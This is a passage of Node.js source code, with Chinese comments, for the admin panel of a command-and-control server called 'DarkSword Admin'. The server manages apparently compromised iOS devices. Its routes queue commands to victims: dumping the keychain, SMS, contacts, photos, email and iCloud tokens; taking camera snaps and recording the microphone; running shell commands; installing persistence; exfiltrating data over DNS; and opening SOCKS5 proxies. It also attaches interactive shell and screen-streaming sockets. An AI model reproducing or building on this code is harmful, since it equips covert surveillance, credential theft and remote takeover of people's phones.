        if (deviceLoot && deviceLoot.files) {
          for (const f of deviceLoot.files) {
            if (f.name && /screenshot|snap|\.png$|\.jpg$/i.test(f.name)) {
              screenshots.push({
                name: f.name,
                size: f.size,
                timestamp: f.ts
              });
            }
          }
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ deviceId, total: screenshots.length, screenshots }));
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Failed to get screenshots' }));
    }
  }

  // POST /admin/api/persist/:deviceId — 管理持久化（安装/检查/移除）
  const persistMatch = pathname.match(/^\/admin\/api\/persist\/([^/]+)$/);
  if (persistMatch && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const deviceId = decodeURIComponent(persistMatch[1]);
    if (!devices.has(deviceId)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Device not found' }));
    }

    try {
      const data = await parseBody(req);
      const action = data.action || 'check'; // install | check | remove

      if (!['install', 'check', 'remove'].includes(action)) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'action must be install|check|remove' }));
      }

      const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);
      const cmdType = action === 'install' ? 'install_persist' :
                      action === 'remove'  ? 'persist_remove' : 'persist_check';
      const cmdArgs = action === 'install' ? { url: data.url || '' } : {};

      if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
      cmdQueue.get(deviceId).push({ cmdId, type: cmdType, args: cmdArgs });

      if (dbReady) {
        try { await db.addCommand(cmdId, deviceId, cmdType, cmdArgs, 'admin'); } catch (e) {}
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, cmdId, action }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid request: ' + e.message }));
    }
  }

  // POST /admin/api/command/:deviceId — 通用命令下发（支持所有扩展命令）
  const genericCmdMatch = pathname.match(/^\/admin\/api\/command\/([^/]+)$/);
  if (genericCmdMatch && method === 'POST') {
    if (!csrfValid(req)) {
      res.writeHead(403, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'CSRF token invalid' }));
    }

    const deviceId = decodeURIComponent(genericCmdMatch[1]);
    if (!devices.has(deviceId)) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Device not found' }));
    }

    try {
      const data = await parseBody(req);
      const cmdType = data.type || '';
      const cmdArgs = data.args || {};

      if (!cmdType) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'command type is required' }));
      }

      // 命令白名单
      const allowedCommands = [
        'dump_keychain', 'dump_wifi', 'dump_contacts', 'dump_sms',
        'dump_location', 'screenshot', 'camera_snap', 'mic_record',
        'list_files', 'read_file', 'download_file', 'exec_shell',
        'dump_icloud_token', 'install_persist', 'dump_photos', 'dump_email',
        'dump_notes', 'list_installed_apps', 'self_destruct',
        'list_processes', 'kill_process', 'network_connections',
        'clipboard_read', 'clipboard_monitor',
        'file_upload', 'file_search', 'sqlite_query',
        'persist_check', 'persist_remove', 'app_foreground_monitor',
        'wifi_scan', 'dns_exfil', 'proxy_socks5'
      ];

      if (!allowedCommands.includes(cmdType)) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Unknown command type: ' + cmdType }));
      }

      const cmdId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).slice(2, 8);

      if (!cmdQueue.has(deviceId)) cmdQueue.set(deviceId, []);
      cmdQueue.get(deviceId).push({ cmdId, type: cmdType, args: cmdArgs });

      if (dbReady) {
        try { await db.addCommand(cmdId, deviceId, cmdType, cmdArgs, 'admin'); } catch (e) {}
        try { await db.logEvent('info', 'cmd', `command queued: ${cmdType}`, deviceId); } catch (e) {}
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ ok: true, cmdId, type: cmdType }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Invalid request: ' + e.message }));
    }
  }



  // 404
  res.writeHead(404, { 'Content-Type': 'text/plain' });
  res.end('Not Found');
  } catch (err) {
    // 未捕获的路由错误：记录并返回 500，防止连接悬挂
    console.error('[Server] Unhandled route error:', err.message);
    try {
      if (!res.headersSent) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Internal Server Error' }));
      }
    } catch {}
  }
});

// ── 附加 WebSocket 服务 ───────────────────────────────────────────────────────
if (interactiveShell && typeof interactiveShell.attach === 'function') {
  try {
    interactiveShell.attach(server, sessionValid);
    console.log('[+] Interactive Shell WebSocket 已附加');
  } catch (e) {
    console.error('[!] Interactive Shell 附加失败:', e.message);
  }
}

if (screenStream && typeof screenStream.attach === 'function') {
  try {
    screenStream.attach(server, sessionValid);
    console.log('[+] Screen Stream WebSocket 已附加');
  } catch (e) {
    console.error('[!] Screen Stream 附加失败:', e.message);
  }
}

if (proxyTunnel && typeof proxyTunnel.attach === 'function') {
  try {
    proxyTunnel.attach(server, sessionValid);
    console.log('[+] Proxy Tunnel WebSocket 已附加');
  } catch (e) {
    console.error('[!] Proxy Tunnel 附加失败:', e.message);
  }
}

// ── 全局连接数限制 ────────────────────────────────────────────────────────────
server.on('connection', (socket) => {
  const ip = socket.remoteAddress || 'unknown';
  // nginx 反代时 remoteAddress 全是 127.0.0.1，不能按 IP 限 10 连接否则整站雪崩
  if (ip === '127.0.0.1' || ip === '::1' || ip === '::ffff:127.0.0.1') {
    return;
  }
  // 尝试获取连接槽位
  if (!connLimiter.acquire(ip)) {
    console.warn(`[Connection Limit] Rejected connection from ${ip} (limit exceeded)`);
    socket.destroy();
    return;
  }
  
  // 连接关闭时释放槽位
  socket.on('close', () => {
    connLimiter.release(ip);
  });
  
  socket.on('error', (err) => {
    // 静默处理连接错误，避免日志污染
    if (process.env.DEBUG) {
      console.debug(`[Connection] Error from ${ip}:`, err.message);
    }
  });
});

// ── 启动 ──────────────────────────────────────────────────────────────────────
// 定期清理僵尸设备记录（每小时执行一次）
setInterval(() => {
  const now = Date.now();
  const inactiveThreshold = 7 * 24 * 60 * 60 * 1000;  // 7 天未活跃
  
  for (const [deviceId, device] of devices.entries()) {
    if (now - device.lastSeen > inactiveThreshold) {
      console.log(`[Cleanup] Removing inactive device: ${deviceId} (last seen: ${new Date(device.lastSeen).toISOString()})`);
      devices.delete(deviceId);
      lootStore.delete(deviceId);
      cmdQueue.delete(deviceId);
      
      // 通知前端设备已被清理
      pushSSE('device_deleted', { deviceId });
    }
  }
}, 60 * 60 * 1000);  // 每小时检查一次

// ── 数据库初始化 + 启动 ───────────────────────────────────────────────────────
(async () => {
  // 尝试连接 MySQL（如果配置了密码）
  if (CONFIG.db.password) {
    try {
      await db.initDB(CONFIG.db);
      dbReady = true;
      console.log('[+] MySQL 数据库已连接');
      
      // 从 DB 恢复设备缓存
      try {
        const dbDevices = await db.getAllDevices();
        for (const d of dbDevices) {
          devices.set(d.device_id, {
            deviceId:    d.device_id,
            name:        d.device_name,
            model:       d.model,
            iosVersion:  d.ios_version,
            ua:          d.ua || '',
            ip:          d.ip || '',
            stage:       d.stage || 'beacon',
            status:      'offline',
            execStatus:  d.exec_status || 'pending',
            firstSeen:   d.first_seen_at ? d.first_seen_at.getTime() : Date.now(),
            lastSeen:    d.last_seen_at ? d.last_seen_at.getTime() : Date.now(),
            onlineMs:    0,
            accessCount: 0,
            extra:       d.extra || {},
          });
        }
        console.log(`[+] 从数据库恢复 ${dbDevices.length} 条设备记录`);
      } catch (e) {
        console.warn('[!] 从数据库恢复设备失败:', e.message);
      }
    } catch (e) {
      console.warn('[!] MySQL 连接失败，将使用纯内存模式:', e.message);
      dbReady = false;
    }
  } else {
    console.log('[*] 未配置 DS_DB_PASSWORD，使用纯内存模式');
  }

  server.listen(CONFIG.port, CONFIG.host, () => {
    const host = CONFIG.host === '0.0.0.0' ? '127.0.0.1' : CONFIG.host;
    console.log('\n[DarkSword Admin] 后台已启动');
    console.log(`  管理地址 : http://${host}:${CONFIG.port}/admin`);
    console.log(`  账号     : ${CONFIG.username}`);
    console.log(`  数据库   : ${dbReady ? 'MySQL (' + CONFIG.db.database + ')' : '内存模式'}`);
    console.log(`  Beacon   : POST http://<server>:${CONFIG.port}/beacon`);
    console.log('  按 Ctrl+C 停止\n');
  });
})();